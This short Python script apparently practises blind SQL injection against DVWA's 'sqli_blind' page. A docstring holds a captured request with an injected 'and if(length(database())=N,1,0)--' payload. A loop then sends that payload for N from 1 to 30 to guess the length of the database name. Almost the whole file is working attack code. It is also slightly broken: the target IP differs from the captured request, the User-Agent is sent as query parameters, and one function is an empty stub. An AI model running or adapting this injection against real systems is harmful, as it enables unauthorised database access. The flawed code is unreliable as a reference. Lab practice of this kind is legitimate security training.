# -*- coding:utf-8  -*-

'''

GET /vulnerabilities/sqli_blind/?id=1%27+and+if%28length%28database%28%29%29%3D4%2C1%2C0%29--&Submit=Submit HTTP/1.1
Host: 192.168.42.100
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.42.100/vulnerabilities/sqli_blind/
Accept-Encoding: gzip, deflate
Accept-Language: zh,en-US;q=0.9,en;q=0.8,et;q=0.7,af;q=0.6
Cookie: PHPSESSID=3f9bja4k400j4enfu7onncvhh5; security=low
Connection: close

'''


import string
import random
import requests

base_url = 'http://192.168.41.100'
params = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
}
for number in range(1,31):
    print(number)
    aa="/vulnerabilities/sqli_blind/?id=1%27+and+if%28length%28database%28%29%29%3D" + str(number) + "%2C1%2C0%29--&Submit=Submit"
    url=base_url+aa
    print(url)
    result = requests.get(url=url,params=params)
    print(result.text)
def judge_db_length():
    pass


